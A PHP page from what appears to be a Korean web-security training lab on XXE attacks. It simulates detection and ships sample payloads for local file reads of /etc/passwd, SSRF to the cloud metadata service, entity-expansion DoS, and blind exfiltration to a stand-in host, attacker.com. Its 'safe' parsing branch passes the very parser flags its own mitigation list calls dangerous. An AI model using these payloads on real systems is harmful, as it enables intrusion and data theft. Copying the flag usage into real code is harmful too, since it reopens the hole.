<?php
/**
 * XXE (XML External Entity) 취약점 테스트 페이지
 * 교육 목적으로만 사용하시기 바랍니다.
 */

session_start();
require_once '../db.php';
require_once '../utils.php';

// 로그인 확인
if (!is_logged_in()) {
    header('Location: ../login.php');
    exit();
}

$result = '';
$xml_input = '';

// XXE 공격 시뮬레이션
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml_data'])) {
    $xml_input = $_POST['xml_data'];
    
    if (empty($xml_input)) {
        $result = "XML 데이터를 입력해주세요.";
    } else {
        // 교육 목적의 XXE 시뮬레이션
        if (strpos($xml_input, '<!ENTITY') !== false && strpos($xml_input, 'SYSTEM') !== false) {
            if (strpos($xml_input, 'file://') !== false) {
                $result = "[시뮬레이션] XXE 공격 감지됨\n";
                $result .= "유형: 로컬 파일 읽기 시도\n";
                $result .= "실제 환경에서는 다음과 같은 파일이 노출될 수 있습니다:\n";
                $result .= "- /etc/passwd (Linux 사용자 정보)\n";
                $result .= "- C:\\Windows\\System32\\drivers\\etc\\hosts\n";
                $result .= "- 애플리케이션 설정 파일\n";
                $result .= "- 데이터베이스 접속 정보";
            } elseif (strpos($xml_input, 'http://') !== false || strpos($xml_input, 'https://') !== false) {
                $result = "[시뮬레이션] XXE SSRF 공격 감지됨\n";
                $result .= "유형: 외부 서버 요청 시도\n";
                $result .= "실제 환경에서는 내부 네트워크 스캔이 가능합니다:\n";
                $result .= "- 내부 서비스 포트 스캔\n";
                $result .= "- AWS 메타데이터 서비스 접근\n";
                $result .= "- 내부 API 엔드포인트 탐지";
            } else {
                $result = "[시뮬레이션] 일반적인 XXE 공격 패턴 감지됨";
            }
        } elseif (strpos($xml_input, '<!DOCTYPE') !== false && strpos($xml_input, '[') !== false) {
            $result = "[시뮬레이션] DOCTYPE 선언 감지됨\n";
            $result .= "잠재적 XXE 공격 가능성이 있습니다.\n";
            $result .= "ENTITY 선언을 통한 추가 공격이 가능할 수 있습니다.";
        } else {
            // 안전한 XML 파싱 시뮬레이션
            libxml_disable_entity_loader(true);
            $dom = new DOMDocument();
            $dom->loadXML($xml_input, LIBXML_NOENT | LIBXML_DTDLOAD);
            
            $result = "안전한 XML 파싱 완료:\n";
            $result .= "입력된 XML이 정상적으로 처리되었습니다.\n";
            $result .= "외부 엔티티나 위험한 패턴이 감지되지 않았습니다.";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XXE 취약점 테스트 - <?php echo SITE_NAME; ?></title>
    <link rel="stylesheet" href="../style.css">
    <style>
        .container {
            max-width: 900px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .vulnerability-description, .mitigation-guide {
            background-color: #f9f9f9;
            border-left: 5px solid #f39c12;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .mitigation-guide {
            border-color: #28a745;
        }
        textarea {
            width: 100%;
            height: 200px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .payload-btn {
            background: #17a2b8;
            color: white;
            border: none;
            padding: 8px 12px;
            margin: 5px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        .payload-btn:hover {
            background: #138496;
        }
        .nav {
            background: #343a40;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .nav h1 {
            margin: 0;
            color: white;
        }
        .nav-links .btn {
            margin-left: 10px;
            background: #007bff;
            color: white;
            text-decoration: none;
            padding: 8px 15px;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- 네비게이션 바 -->
        <nav class="nav">
            <h1>XXE 취약점 테스트</h1>
            <div class="nav-links">
                <span>환영합니다, <?php echo safe_output($_SESSION['username']); ?>님!</span>
                <a href="../index.php" class="btn">메인으로</a>
                <a href="index.php" class="btn">웹해킹 메뉴</a>
                <a href="../logout.php" class="btn">로그아웃</a>
            </div>
        </nav>

        <div class="vulnerability-description">
            <h2>📄 XXE (XML External Entity) 취약점</h2>
            <p><strong>설명:</strong> XML 파서가 외부 엔티티를 처리할 때 발생하는 취약점입니다. 
            로컬 파일 읽기, SSRF 공격, DoS 공격 등이 가능합니다.</p>
            
            <h3>📋 테스트 페이로드:</h3>
            <div style="margin: 10px 0;">
                <button onclick="testPayload('file')" class="payload-btn">파일 읽기</button>
                <button onclick="testPayload('ssrf')" class="payload-btn">SSRF 공격</button>
                <button onclick="testPayload('dos')" class="payload-btn">DoS 공격</button>
                <button onclick="testPayload('blind')" class="payload-btn">Blind XXE</button>
                <button onclick="testPayload('safe')" class="payload-btn">안전한 XML</button>
            </div>
        </div>

        <form method="POST">
            <label for="xml_data">🎯 XML 데이터 입력:</label><br>
            <textarea id="xml_data" name="xml_data" placeholder="XML 데이터를 입력하세요..."><?php echo htmlspecialchars($xml_input); ?></textarea><br><br>
            <input type="submit" value="XML 파싱" class="btn">
        </form>

        <?php if (!empty($result)): ?>
            <div style="margin-top: 20px;">
                <h2>📊 테스트 결과:</h2>
                <pre style="background: #f1f3f4; padding: 15px; border-radius: 5px; border-left: 4px solid #dc3545;"><?php echo htmlspecialchars($result); ?></pre>
            </div>
        <?php endif; ?>

        <div class="mitigation-guide">
            <h2>🛡️ 방어 방법</h2>
            <ul>
                <li><strong>외부 엔티티 비활성화:</strong> libxml_disable_entity_loader(true) 사용</li>
                <li><strong>안전한 파서 설정:</strong> LIBXML_NOENT, LIBXML_DTDLOAD 플래그 제거</li>
                <li><strong>입력 검증:</strong> DOCTYPE, ENTITY 선언 필터링</li>
                <li><strong>JSON 사용:</strong> 가능한 경우 XML 대신 JSON 사용</li>
                <li><strong>네트워크 분리:</strong> XML 파서를 격리된 환경에서 실행</li>
            </ul>
        </div>

        <div style="margin-top: 20px; text-align: center;">
            <a href="index.php" class="btn">← 웹해킹 테스트 메뉴로 돌아가기</a>
        </div>
    </div>

    <script>
        function testPayload(type) {
            let payload = '';
            
            switch(type) {
                case 'file':
                    payload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&file;</data>
</root>`;
                    break;
                    
                case 'ssrf':
                    payload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
    <data>&ssrf;</data>
</root>`;
                    break;
                    
                case 'dos':
                    payload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>
    <data>&lol3;</data>
</root>`;
                    break;
                    
                case 'blind':
                    payload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
    %eval;
    %exfiltrate;
]>
<root></root>`;
                    break;
                    
                case 'safe':
                    payload = `<?xml version="1.0" encoding="UTF-8"?>
<root>
    <user>
        <name>테스트 사용자</name>
        <email>test@example.com</email>
        <role>user</role>
    </user>
</root>`;
                    break;
            }
            
            if (confirm('⚠️ 교육 목적의 XXE 테스트를 실행하시겠습니까?\n\n유형: ' + type)) {
                document.getElementById('xml_data').value = payload;
            }
        }

        // 위험 패턴 경고
        document.getElementById('xml_data').addEventListener('input', function() {
            const value = this.value.toLowerCase();
            const warningPatterns = ['<!entity', 'system', 'file://', 'http://'];
            
            let isRisky = warningPatterns.some(pattern => value.includes(pattern));
            
            if (isRisky) {
                this.style.borderColor = '#dc3545';
                this.style.backgroundColor = '#fff5f5';
            } else {
                this.style.borderColor = '#ddd';
                this.style.backgroundColor = 'white';
            }
        });
    </script>
</body>
</html>